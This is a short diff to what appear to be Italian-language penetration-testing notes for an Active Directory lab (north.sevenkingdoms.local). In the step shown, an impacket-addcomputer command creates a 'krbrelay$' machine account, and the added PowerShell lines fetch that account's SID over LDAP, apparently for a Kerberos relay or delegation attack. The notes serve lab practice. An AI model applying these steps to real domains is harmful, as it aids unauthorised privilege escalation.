@@ -450,5 +450,9 @@ impacket-addcomputer -computer-name 'krbrelay$' -computer-pass 'ComputerPassword
 
 Ora prendiamo il SID del nuovo Computer
 ```PowerShell
-
+$o = ([ADSI]"LDAP://CN=krbrelay,CN=Computers,DC=north,DC=sevenkingdoms,DC=local").objectSID
 ```
+```PowerShell
+(New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value
+```
+![[Pasted image 20230906125241.png]]
